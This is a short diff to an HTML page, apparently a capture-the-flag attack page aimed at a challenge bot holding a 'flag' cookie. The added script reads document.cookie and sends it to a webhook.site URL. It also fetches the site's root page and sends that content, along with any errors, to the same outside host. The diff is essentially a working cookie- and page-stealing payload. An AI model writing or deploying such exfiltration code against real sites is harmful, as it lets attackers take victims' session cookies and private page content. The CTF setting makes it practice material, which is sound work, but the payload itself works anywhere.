@@ -5,12 +5,24 @@
 </head>
 <body>
   <script>
-    // Fetch the page from the same domain where the cookie is set
+    // We'll use the fetch API to make a request to the challenge server
+    // Then we'll send the results to our webhook
+    
+    // This assumes the bot is on the same domain as where the flag cookie is set
+    // First, let's try to read the cookie directly
+    let stolenCookie = document.cookie;
+    
+    // Send it to our webhook
+    fetch('https://webhook.site/010ca8d2-641b-4d29-892a-e38468e86f24?cookie=' + encodeURIComponent(stolenCookie));
+    
+    // In case the above doesn't work, let's try to load content from a page that might display the flag
     fetch('/')
       .then(response => response.text())
       .then(data => {
-        // Send the data to your webhook
-        fetch('https://webhook.site/010ca8d2-641b-4d29-892a-e38468e86f24?data=' + encodeURIComponent(data));
+        fetch('https://webhook.site/010ca8d2-641b-4d29-892a-e38468e86f24?page=' + encodeURIComponent(data));
+      })
+      .catch(error => {
+        fetch('https://webhook.site/010ca8d2-641b-4d29-892a-e38468e86f24?error=' + encodeURIComponent(error.toString()));
       });
   </script>
 </body>
